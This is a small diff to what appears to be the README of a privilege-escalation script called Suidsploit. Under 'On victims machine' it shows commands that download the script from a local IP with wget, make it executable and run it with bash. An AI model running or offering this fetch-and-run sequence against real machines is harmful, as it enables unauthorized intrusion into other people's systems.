@@ -32,7 +32,9 @@ On victims machine:
 
 '''sh
 $ wget http://192.168.xxx.xxx/Suidsploit.ob.sh
+
 $ chmod +x Suidsploit.ob.sh
+
 $ bash Suidsploit.ob.sh
 '''
 ### Todos
